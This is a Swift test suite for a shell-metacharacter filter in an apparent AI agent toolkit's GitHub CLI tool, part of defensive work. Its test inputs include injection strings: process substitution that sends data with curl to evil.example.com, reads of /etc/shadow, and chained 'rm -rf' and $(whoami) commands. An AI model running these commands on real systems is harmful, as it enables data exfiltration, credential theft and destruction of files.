import Testing
import Foundation
@testable import AgentSmithKit

/// Tests for `GhTool.firstForbiddenSequence(in:)` — the pre-flight filter that rejects
/// shell metasequences before the args reach `/bin/bash -l -c "exec gh <args>"`.
///
/// Allowed: `~`, `$VAR`, pipes (`|`), redirection (`>`, `>>`, `<`, `2>`, `<<` heredoc),
/// `&` between word characters (URL query strings), quoted strings with no other forbidden tokens.
/// Blocked: `;`, `&&`, `||`, `<<<`, backticks, `$(...)`, newlines, carriage returns, and any
/// bare `&` used to background or chain commands (`& cmd`, trailing `&`, leading `& cmd`).
///
/// The substring-list portion of the filter is naive substring matching — it does NOT
/// understand shell quoting. Tests document that as a deliberate trade-off (false positives
/// are fine; false negatives are not). The `&` check is more careful: it rejects an `&` only
/// when it's adjacent to whitespace (i.e., functioning as a command separator), so URL queries
/// like `?a=1&b=2` keep working.
@Suite("GhTool args filter")
struct GhToolArgsFilterTests {

    // MARK: - Allowed cases

    @Test("plain identifier-style args are allowed")
    func plainArgsAllowed() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view drewster99/agent-smith") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "pr list") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "auth status") == nil)
    }

    @Test("tilde expansion is allowed")
    func tildeAllowed() {
        #expect(GhTool.firstForbiddenSequence(in: "release upload v1.0 ~/Downloads/asset.zip") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "config set --file ~/.config/gh/hosts.yml") == nil)
    }

    @Test("dollar-name var expansion is allowed (only $( is blocked)")
    func dollarVarAllowed() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view $REPO_NAME") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "pr create --title \"$TITLE\"") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "issue view $ISSUE_NUMBER --json title") == nil)
    }

    @Test("pipes are allowed")
    func pipesAllowed() {
        #expect(GhTool.firstForbiddenSequence(in: "issue list --json number,title | jq .") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "repo list | grep foo | head -5") == nil)
    }

    @Test("redirection is allowed")
    func redirectionAllowed() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo > /tmp/out.json") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo >> /tmp/out.log") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar < /tmp/payload.json") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo 2> /tmp/err") == nil)
    }

    @Test("`<<` heredoc start is allowed; only `<<<` here-strings are blocked")
    func heredocAllowed() {
        // Heredoc syntax requires multi-line content but a single-line `<<TAG` is harmless.
        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar <<EOF") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo --input - <<JSON") == nil)
    }

    @Test("trailing `&` (background) is now blocked as a chaining vector")
    func trailingAmpersandBlocked() {
        // `cmd &` backgrounds the command and is a documented chaining vector
        // (`gh foo & rm /tmp/x`) — block it. Jones can still gate intentional uses
        // by approving them as a regular tool call.
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo &") == "&")
    }

    @Test("`&` followed by whitespace + another command is blocked")
    func ampersandThenCommandBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo & rm /tmp/x") == "&")
    }

    @Test("ampersand inside a URL or query string is allowed (between word chars)")
    func ampersandInUrlAllowed() {
        // URLs commonly contain `&` between alphanumeric characters and not as a
        // separator with surrounding whitespace.
        #expect(GhTool.firstForbiddenSequence(in: "api 'repos/foo/bar?state=open&per_page=100'") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "api 'repos/foo?a=1&b=2&c=3'") == nil)
    }

    @Test("newline is blocked (bash treats it as a command separator inside -c)")
    func newlineBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "auth status\nrm -rf /tmp") == "\n")
        #expect(GhTool.firstForbiddenSequence(in: "auth status\n") == "\n")
    }

    @Test("carriage return is blocked")
    func carriageReturnBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "auth status\rrm -rf /tmp") == "\r")
    }

    @Test("single-quoted jq filter is allowed")
    func quotedJqAllowed() {
        // Single quotes around a jq expression don't help bypass the filter; they're allowed
        // here only because the jq body itself contains no forbidden tokens.
        #expect(GhTool.firstForbiddenSequence(in: "issue list --json number,title --jq '.[].number'") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "pr list --json number,title --jq 'map(select(.title | startswith(\"WIP\")))'") == nil)
    }

    @Test("double-quoted args with no forbidden tokens are allowed")
    func quotedTitlesAllowed() {
        #expect(GhTool.firstForbiddenSequence(in: "pr create --title \"Fix login bug\"") == nil)
        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"Bug: page crashes on save\" --body \"reproduction steps\"") == nil)
    }

    @Test("the empty string is allowed (caller validates separately)")
    func emptyAllowed() {
        #expect(GhTool.firstForbiddenSequence(in: "") == nil)
    }

    @Test("dollar with space (not command substitution) is allowed")
    func dollarSpaceAllowed() {
        // `$ ` is not `$(`, so the filter must not flag it.
        #expect(GhTool.firstForbiddenSequence(in: "issue create --body \"costs $ 50\"") == nil)
    }

    // MARK: - Blocked cases

    @Test("semicolon command separator is blocked")
    func semicolonBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo; rm /tmp/x") == ";")
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo;rm -rf /tmp") == ";")
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo;") == ";")
        #expect(GhTool.firstForbiddenSequence(in: ";repo view foo") == ";")
    }

    @Test("logical AND is blocked")
    func logicalAndBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo && rm /tmp/x") == "&&")
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo&&rm -rf /tmp") == "&&")
    }

    @Test("logical OR is blocked")
    func logicalOrBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo || curl evil.example.com") == "||")
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo||echo failed") == "||")
    }

    @Test("backtick command substitution is blocked")
    func backtickBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view `whoami`") == "`")
        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"by `whoami`\"") == "`")
    }

    @Test("dollar-paren command substitution is blocked")
    func dollarParenBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view $(whoami)") == "$(")
        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"reported by $(id -un)\"") == "$(")
        #expect(GhTool.firstForbiddenSequence(in: "release upload v1 $(ls /tmp/*.zip)") == "$(")
    }

    @Test("here-string `<<<` is blocked")
    func hereStringBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar <<< 'payload'") == "<<<")
        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo/bar <<<payload") == "<<<")
    }

    // MARK: - Documented false positives (deliberate)

    @Test("forbidden sequence inside a quoted string is still blocked (naive scan)")
    func quotedSemicolonBlocked() {
        // Naive scan: we don't try to understand quoting. This is a documented false
        // positive — preferable to false negatives that would let the sequence through.
        #expect(GhTool.firstForbiddenSequence(in: "pr create --title \"fix: bug; not feature\"") == ";")
        #expect(GhTool.firstForbiddenSequence(in: "issue create --body 'a && b'") == "&&")
        #expect(GhTool.firstForbiddenSequence(in: "pr create --title \"x || y\"") == "||")
    }

    @Test("escaped backtick still trips the filter")
    func escapedBacktickBlocked() {
        // We don't attempt to interpret backslash escapes either.
        #expect(GhTool.firstForbiddenSequence(in: "repo view \\`whoami\\`") == "`")
    }

    // MARK: - First-match precedence

    @Test("when multiple forbidden sequences are present, the first matched is reported")
    func multipleViolationsReportOne() {
        // The exact match returned depends on iteration order in `forbiddenSequences`,
        // but it must be ONE of the present sequences (not nil).
        let result = GhTool.firstForbiddenSequence(in: "foo; bar && baz || qux")
        #expect(result != nil)
        if let result {
            #expect(["&&", "||", ";"].contains(result))
        }
    }

    @Test("`&&` is reported as `&&`, not as `&` (multi-char before single-char check)")
    func doubleAmpersandNotReportedAsSingle() {
        // The block list contains `&&` but not `&`. A naive single-char check would
        // either over-report `&` or miss `&&`. Confirm the actual behavior.
        #expect(GhTool.firstForbiddenSequence(in: "foo && bar") == "&&")
    }

    @Test("`||` is reported as `||`, not as `|`")
    func doublePipeNotReportedAsSingle() {
        // `|` (pipe) is allowed; `||` (logical OR) is blocked. Confirm the longer match.
        #expect(GhTool.firstForbiddenSequence(in: "foo || bar") == "||")
    }

    @Test("`<<<` is reported as `<<<`, not `<<` or `<`")
    func tripleAngleNotReportedAsShorter() {
        // `<<` (heredoc) is allowed; `<<<` (here-string) is blocked.
        #expect(GhTool.firstForbiddenSequence(in: "cmd <<< payload") == "<<<")
    }

    // MARK: - Coverage of the canonical block list

    @Test("the published block list matches what the filter actually rejects")
    func blockListSelfConsistency() {
        // If anyone edits `forbiddenSequences`, this test surfaces drift between the
        // declared list and what is actually testable end-to-end.
        for needle in GhTool.forbiddenSequences {
            let synthetic = "repo view foo \(needle) trailing"
            #expect(
                GhTool.firstForbiddenSequence(in: synthetic) != nil,
                "Block-list entry '\(needle)' did not trigger the filter"
            )
        }
    }

    // MARK: - Process substitution (added defense)

    @Test("bash process substitution `>(...)` is blocked")
    func processSubstitutionWriteBlocked() {
        // `gh repo view foo >(curl evil.example.com -d @-)` is a documented exfil channel.
        #expect(GhTool.firstForbiddenSequence(in: "repo view foo >(curl evil.example.com -d @-)") == ">(")
    }

    @Test("bash process substitution `<(...)` is blocked")
    func processSubstitutionReadBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "api repos/foo --input <(cat /etc/shadow)") == "<(")
    }

    @Test("`${...}` parameter expansion is blocked")
    func parameterExpansionBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "repo view ${HOME:?missing}") == "${")
        #expect(GhTool.firstForbiddenSequence(in: "issue create --title \"${USER:-anon}\"") == "${")
    }

    @Test("NUL byte is blocked")
    func nulByteBlocked() {
        #expect(GhTool.firstForbiddenSequence(in: "auth status\u{0000}whoami") == "\0")
    }

    // MARK: - execute() integration (verifies refusal goes all the way through)

    @Test("execute() returns failed result for an args string containing a forbidden sequence")
    func executeRefusesForbiddenArgs() async throws {
        let tool = GhTool(authStatusSnapshot: "(test)")
        let result = try await tool.execute(
            arguments: ["args": .string("repo view foo; rm /tmp/x")],
            context: Self.makeContext()
        )
        #expect(!result.succeeded)
        #expect(result.output.contains("forbidden shell sequence"))
        #expect(result.output.contains(";"))
    }

    @Test("execute() returns failed result for process substitution")
    func executeRefusesProcessSubstitution() async throws {
        let tool = GhTool(authStatusSnapshot: "(test)")
        let result = try await tool.execute(
            arguments: ["args": .string("repo view foo >(curl evil.example.com)")],
            context: Self.makeContext()
        )
        #expect(!result.succeeded)
        #expect(result.output.contains(">("))
    }

    /// Minimal `ToolContext` for direct tool-level integration tests. Mirrors
    /// `AgentActorTests.makeContext` — refused-args paths short-circuit before any
    /// tracker/state callbacks fire, so the fatalError defaults on those closures
    /// are unreachable for these specific tests.
    private static func makeContext() -> ToolContext {
        ToolContext(
            agentID: UUID(),
            agentRole: .brown,
            channel: MessageChannel(),
            taskStore: TaskStore(),
            spawnBrown: { nil },
            terminateAgent: { _, _ in false },
            abort: { _, _ in },
            agentRoleForID: { _ in nil },
            memoryStore: MemoryStore(engine: SemanticSearchEngine()),
            setToolExecutionStatus: { _, _ in },
            hasToolSucceeded: { _ in false },
            hasToolFailed: { _ in false }
        )
    }
}
